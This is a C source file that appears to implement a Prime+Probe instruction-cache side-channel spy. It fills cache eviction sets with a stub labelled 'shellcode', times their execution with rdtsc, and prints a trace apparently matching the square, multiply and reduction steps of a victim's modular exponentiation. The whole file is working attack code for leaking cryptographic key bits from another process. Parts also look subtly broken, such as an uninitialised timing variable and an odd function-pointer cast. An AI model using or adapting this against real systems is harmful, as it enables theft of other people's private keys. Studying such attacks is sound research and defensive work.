#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>
#include "cacheutils.h"
#include <stdint.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/time.h>
#define threshold 400
size_t kpause = 0;
char *shellcode = "\x55\x48\x89\xe5\x90\x5d\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3"; 
char buffer[32*1024]={};
int sq = 0x8100f9e;
int mul = 0x810093d;
int remain = 0x8100251;
int rem[8];
int square[8];
int mult[8];
void eviction_set(int set_no,char c){
	int i;
	for(i=0; i<= 7 ;i++){
		if(c == 'r'){
			strcpy(buffer+((set_no-3)*64+i*4096), shellcode);
			rem[i] = ((set_no-3)*64+i*4096);
		}
		if(c == 'M'){
			strcpy(buffer+((set_no-3)*64+i*4096), shellcode);
			mult[i] = ((set_no-3)*64+i*4096);
		}
		if(c == 'S'){
			strcpy(buffer+((set_no-3)*64+i*4096), shellcode);
			square[i] = ((set_no-3)*64+i*4096);
		}
	}
}
int main(int argc, char **argv)
{
	int i, k=10000000;
	printf("%p\n", buffer);
	printf("%p\n", shellcode);
	//rem_1 = strcpy(buffer+90, shellcode);
	eviction_set(62,'S');
	eviction_set(36, 'M');
	eviction_set(9,'r');
	printf("%x\t",mul);
	fprintf(stdout,"Length: %ld\n",strlen(shellcode));
	for(i=0;i<=7;i++){
			printf("%p\t", buffer + square[i]);
	}
	size_t  delta1, delta2, start, end, time, delta;
	int sum=0;
	uint64_t e=0,a;
	
	while(k){
		sum ++;
		for(i=0,delta1 = 0; i<= 7 ; i++){
			asm volatile ("cpuid");   
			asm volatile ("lfence");       
			asm volatile ("rdtsc");       
			asm volatile("mov %%rax, %%rdi"::: "rax"); 
			(*(void(*)())buffer+square[i])();
			asm volatile ("rdtsc");      
			asm volatile ("mov %%rax, %0":"=r"(a));    
			asm volatile ("mov %%rdi,%0":"=r"(e));   
			asm volatile ("lfence");     
			end =  a; 
			start = e;       
			delta1 += end - start;
		}
		if(delta1 > threshold  && delta1 < threshold+50)
			printf("|-%d-%ld-S",sum,delta1) && (sum = 0);
		for(i=0,delta1 = 0; i<= 7 ; i++){
			asm volatile ("cpuid");   
			asm volatile ("lfence");       
			asm volatile ("rdtsc");       
			asm volatile("mov %%rax, %%rdi"::: "rax"); 
			(*(void(*)())buffer+mult[i])();
			asm volatile ("rdtsc");      
			asm volatile ("mov %%rax, %0":"=r"(a));    
			asm volatile ("mov %%rdi,%0":"=r"(e));   
			asm volatile ("lfence");     
			end =  a; 
			start = e;       
			delta1 += end - start;
		}
		if(delta1 > threshold && delta1 < threshold+50 )
			printf("|-%d-%ld-M",sum,delta1) &&(sum = 0);
		for(i=0,delta1 = 0; i<= 7 ; i++){
			asm volatile ("cpuid");   
			asm volatile ("lfence");       
			asm volatile ("rdtsc");       
			asm volatile("mov %%rax, %%rdi"::: "rax"); 
			(*(void(*)())buffer+rem[i])();
			asm volatile ("rdtsc");      
			asm volatile ("mov %%rax, %0":"=r"(a));    
			asm volatile ("mov %%rdi,%0":"=r"(e));   
			asm volatile ("lfence");     
			end =  a; 
			start = e;       
			delta1 += end - start;
		}
		if(delta1 > threshold  && delta1 < threshold+50)
			printf("|-%d-%ld-r",sum,delta1) && (sum = 0);
		
		time = rdtsc();	
		while(delta < 400){
		delta = rdtsc()-time;
		}
		sum ++;
		for(i=7,delta2=0; i >= 0; i--){
			asm volatile ("cpuid");   
			asm volatile ("lfence");       
			asm volatile ("rdtsc");       
			asm volatile("mov %%rax, %%rdi"::: "rax"); 
			(*(void(*)())buffer+square[i])();
			asm volatile ("rdtsc");      
			asm volatile ("mov %%rax, %0":"=r"(a));    
			asm volatile ("mov %%rdi,%0":"=r"(e));   
			asm volatile ("lfence");     
			end =  a; 
			start = e;       
			delta2 += end - start;
			
		}
		if( delta2 > threshold  && delta2 < threshold+50)
			 printf("|-%d-%ld-S",sum,delta2) && (sum = 0);
		for(i=7,delta2=0; i >= 0; i--){
			asm volatile ("cpuid");   
			asm volatile ("lfence");       
			asm volatile ("rdtsc");       
			asm volatile("mov %%rax, %%rdi"::: "rax"); 
			(*(void(*)())buffer+mult[i])();
			asm volatile ("rdtsc");      
			asm volatile ("mov %%rax, %0":"=r"(a));    
			asm volatile ("mov %%rdi,%0":"=r"(e));   
			asm volatile ("lfence");     
			end =  a; 
			start = e;       
			delta2 += end - start;
			
		}
		if( delta2 > threshold && delta2 < threshold+50)
			 printf("|-%d-%ld-M",sum,delta2) && (sum = 0);
		for(i=7,delta2=0; i >= 0; i--){
			asm volatile ("cpuid");   
			asm volatile ("lfence");       
			asm volatile ("rdtsc");       
			asm volatile("mov %%rax, %%rdi"::: "rax"); 
			(*(void(*)())buffer+rem[i])();
			asm volatile ("rdtsc");      
			asm volatile ("mov %%rax, %0":"=r"(a));    
			asm volatile ("mov %%rdi,%0":"=r"(e));   
			asm volatile ("lfence");     
			end =  a; 
			start = e;       
			delta2 += end - start;
			
		}
		if( delta2 > threshold  && delta2 < threshold+50)
			 printf("|-%d-%ld-r",sum,delta2) && (sum = 0);
		k--;
	}
}
